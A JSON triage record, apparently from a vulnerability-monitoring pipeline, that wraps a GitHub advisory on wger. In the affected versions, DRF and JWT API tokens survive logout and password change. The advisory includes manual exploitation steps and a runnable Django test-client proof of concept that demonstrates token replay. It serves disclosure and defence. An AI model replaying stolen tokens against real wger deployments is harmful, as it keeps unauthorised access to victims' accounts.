@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 4, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/88771533?v=4\", \"events_url\": \"https://api.github.com/users/VashuVats/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/VashuVats/followers\", \"following_url\": \"https://api.github.com/users/VashuVats/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/VashuVats/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/VashuVats\", \"id\": 88771533, \"login\": \"VashuVats\", \"node_id\": \"MDQ6VXNlcjg4NzcxNTMz\", \"organizations_url\": \"https://api.github.com/users/VashuVats/orgs\", \"received_events_url\": \"https://api.github.com/users/VashuVats/received_events\", \"repos_url\": \"https://api.github.com/users/VashuVats/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/VashuVats/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/VashuVats/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/VashuVats\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-46437\", \"cvss\": {\"score\": 4.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 4.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-287\", \"name\": \"Improper Authentication\"}, {\"cwe_id\": \"CWE-613\", \"name\": \"Insufficient Session Expiration\"}], \"description\": \"### Summary\\n\\nA vulnerability exists in the authentication/session lifecycle of `wger` where **bearer-style API credentials** remain valid **after a user logs out and after a user changes their password**. An attacker who steals a victim’s **DRF authtoken** (`Authorization: Token ...`) or **JWT refresh token** can continue to access protected `/api/v2/*` endpoints until the token is manually rotated/deleted (DRF token) or naturally expires (JWT refresh).\\nlifecycle events do not revoke these credentials:\\n- **Logout** (`/user/logout`) only clears the Django session cookie via `django_logout()` and does not revoke API tokens.\\n- **Password change** updates the password hash, but does not revoke:\\n  - existing DRF tokens stored in `authtoken_token`\\n  - existing JWT refresh tokens (no server-side revocation list or token versioning); refresh can continue minting new access tokens until refresh expiry.\\n\\n\\n#### Vulnerable Files\\n\\n- `wger/wger/core/views/user.py` (logout implementation)\\n- `wger/settings/settings_global.py` (DRF auth configuration, SimpleJWT defaults)\\n- `wger/settings/main.py` (commonly used production defaults for JWT lifetimes)\\n- `wger/wger/utils/api_token.py` (authtoken rotation is manual only)\\n\\n### PoC (Proof of Concept)\\n\\n#### Manual Exploitation Steps\\n\\n1. Create a user account.\\n2. Obtain a JWT refresh token:\\n   - `POST /api/v2/token` with username/password.\\n3. Obtain a DRF token (API key):\\n   - use `/user/api-key` (or create token via admin/DB in a test environment).\\n4. Change password:\\n   - `POST /<lang>/user/password/change` with `old_password`, `new_password1`, `new_password2`.\\n5. Prove token replay:\\n   - Call a private endpoint using the *old* DRF token (should still return `200`).\\n   - Call `POST /api/v2/token/refresh` using the *old* refresh token (should still return `200` and a new access token).\\n\\n#### Automation PoC (Python)\\n\\nCopy/paste runnable PoC (Django in-process test client; no dev server required):\\n\\n```python\\nimport json\\nimport os\\n\\n\\ndef main() -> None:\\n    \\\"\\\"\\\"\\n    PoC for IDENTITY-VULN-01:\\n    Proves that password change does not revoke:\\n      - DRF authtoken (Authorization: Token <key>)\\n      - JWT refresh tokens (still mint access tokens)\\n\\n    This PoC runs entirely in-process using Django's test client + DRF APIClient.\\n    It does not require running the dev server.\\n    \\\"\\\"\\\"\\n\\n    os.environ.setdefault(\\\"DJANGO_SETTINGS_MODULE\\\", \\\"settings.main\\\")\\n    # Ensure we use the local sqlite DB path used during setup\\n    os.environ.setdefault(\\\"DJANGO_DB_DATABASE\\\", \\\"db.sqlite3\\\")\\n    os.environ.setdefault(\\\"DJANGO_MEDIA_ROOT\\\", \\\"media\\\")\\n\\n    import django\\n\\n    django.setup()\\n\\n    from django.conf import settings\\n    from django.contrib.auth.models import User\\n    from django.test import Client\\n    from rest_framework.authtoken.models import Token\\n    from rest_framework.test import APIClient\\n\\n    username = \\\"pwchange_user_poc\\\"\\n    old_pw = \\\"OldPassw0rd!\\\"\\n    new_pw = \\\"NewPassw0rd!\\\"\\n\\n    # Create a clean user + DRF token\\n    User.objects.filter(username=username).delete()\\n    user = User.objects.create_user(username=username, password=old_pw)\\n    Token.objects.filter(user=user).delete()\\n    drf_token = Token.objects.create(user=user).key\\n\\n    api = APIClient()\\n\\n    # Obtain JWT tokens with old password (proof baseline)\\n    r_obtain = api.post(\\\"/api/v2/token\\\", {\\\"username\\\": username, \\\"password\\\": old_pw}, format=\\\"json\\\")\\n    refresh = getattr(r_obtain, \\\"data\\\", {}).get(\\\"refresh\\\")\\n\\n    # Change password through the actual password change endpoint\\n    web = Client()\\n    web.force_login(user)\\n    r_pw = web.post(\\n        \\\"/en/user/password/change\\\",\\n        data={\\\"old_password\\\": old_pw, \\\"new_password1\\\": new_pw, \\\"new_password2\\\": new_pw},\\n        follow=False,\\n    )\\n\\n    # Old password should fail now (sanity check)\\n    r_obtain_old = api.post(\\n        \\\"/api/v2/token\\\",\\n        {\\\"username\\\": username, \\\"password\\\": old_pw},\\n        format=\\\"json\\\",\\n    )\\n\\n    # New password should work\\n    r_obtain_new = api.post(\\n        \\\"/api/v2/token\\\",\\n        {\\\"username\\\": username, \\\"password\\\": new_pw},\\n        format=\\\"json\\\",\\n    )\\n\\n    # DRF token remains valid (private endpoint still accessible)\\n    api.credentials(HTTP_AUTHORIZATION=f\\\"Token {drf_token}\\\")\\n    r_drf = api.get(\\\"/api/v2/weightentry/\\\")\\n\\n    # Old refresh remains valid (still mints a new access token)\\n    api.credentials()\\n    r_refresh = api.post(\\\"/api/v2/token/refresh\\\", {\\\"refresh\\\": refresh}, format=\\\"json\\\")\\n\\n    out = {\\n        \\\"jwt_refresh_lifetime_seconds\\\": int(settings.SIMPLE_JWT[\\\"REFRESH_TOKEN_LIFETIME\\\"].total_seconds()),\\n        \\\"jwt_access_lifetime_seconds\\\": int(settings.SIMPLE_JWT[\\\"ACCESS_TOKEN_LIFETIME\\\"].total_seconds()),\\n        \\\"jwt_obtain_oldpw_before_change\\\": r_obtain.status_code,\\n        \\\"password_change_status\\\": r_pw.status_code,\\n        \\\"jwt_obtain_oldpw_after_change\\\": r_obtain_old.status_code,\\n        \\\"jwt_obtain_newpw_after_change\\\": r_obtain_new.status_code,\\n        \\\"drf_token_private_api_after_change\\\": r_drf.status_code,\\n        \\\"jwt_refresh_with_old_refresh_after_change\\\": r_refresh.status_code,\\n        \\\"jwt_refresh_response_keys\\\": sorted(list(getattr(r_refresh, \\\"data\\\", {}).keys())),\\n    }\\n\\n    print(json.dumps(out, indent=2))\\n\\n\\nif __name__ == \\\"__main__\\\":\\n    main()\\n```\\n\\nExpected output (example from a successful run):\\n\\n```json\\n{\\n  \\\"jwt_refresh_lifetime_seconds\\\": 86400,\\n  \\\"jwt_access_lifetime_seconds\\\": 900,\\n  \\\"jwt_obtain_oldpw_before_change\\\": 200,\\n  \\\"password_change_status\\\": 302,\\n  \\\"jwt_obtain_oldpw_after_change\\\": 401,\\n  \\\"jwt_obtain_newpw_after_change\\\": 200,\\n  \\\"drf_token_private_api_after_change\\\": 200,\\n  \\\"jwt_refresh_with_old_refresh_after_change\\\": 200,\\n  \\\"jwt_refresh_response_keys\\\": [\\n    \\\"access\\\"\\n  ]\\n}\\n```\\n\\n### Impact\\nA user logs into the wger mobile app, their DRF token is intercepted via a MitM on a public WiFi network. The user notices suspicious activity, changes their password and logs out. Despite these remediation steps, the attacker's copy of the token remains fully valid.\\nIf an attacker obtains a victim’s API credential once, the victim’s primary remediation actions (**logout** and **password change**) do not terminate attacker access.\\n- **Confidentiality:** attacker retains access to victim’s private API data (depends on endpoints used).\\n- **Integrity:** attacker can perform any API mutations permitted to the victim’s account.\", \"ghsa_id\": \"GHSA-v3x9-6gg8-c2c9\", \"github_reviewed_at\": \"2026-10-07T13:59:10Z\", \"html_url\": \"https://github.com/advisories/GHSA-v3x9-6gg8-c2c9\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-v3x9-6gg8-c2c9\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-46437\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-07T13:59:10Z\", \"references\": [\"https://github.com/wger-project/wger/security/advisories/GHSA-v3x9-6gg8-c2c9\", \"https://github.com/wger-project/wger/releases/tag/2.6\", \"https://github.com/advisories/GHSA-v3x9-6gg8-c2c9\"], \"repository_advisory_url\": \"https://api.github.com/repos/wger-project/wger/security-advisories/GHSA-v3x9-6gg8-c2c9\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/wger-project/wger\", \"summary\": \"wger: API credentials remain valid after logout/password change\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-07T13:59:11Z\", \"url\": \"https://api.github.com/advisories/GHSA-v3x9-6gg8-c2c9\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"pip\", \"name\": \"wger\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 2.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-v3x9-6gg8-c2c9",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "wger: <= 2.1"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-46437"
+    ],
+    "cvss_score": 4.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "wger"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-10-07T19:15:14.203591Z",
+  "provenance": {
+    "content_sha256": "658502a07767698bc9d605a49fd1f3a679879486f7835a5ca8e4b9432f9f97f1",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-07T13:59:10Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-v3x9-6gg8-c2c9",
+  "status": "active",
+  "title": "wger: API credentials remain valid after logout/password change",
+  "updated_at": "2026-10-07T13:59:11Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-v3x9-6gg8-c2c9"
+}
